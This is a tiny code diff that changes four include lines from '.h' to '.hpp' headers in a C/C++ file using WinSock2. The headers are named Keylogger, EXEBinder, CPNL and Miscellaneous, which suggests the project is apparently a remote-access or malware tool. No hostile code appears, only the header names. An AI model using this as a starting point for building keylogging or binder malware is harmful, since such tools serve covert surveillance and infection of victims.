@@ -6,7 +6,7 @@
 */
 #include <WinSock2.h>
 
-#include "CPNL.h"
-#include "Keylogger.h"
-#include "Miscellaneous.h"
-#include "EXEBinder.h"
+#include "CPNL.hpp"
+#include "Keylogger.hpp"
+#include "Miscellaneous.hpp"
+#include "EXEBinder.hpp"
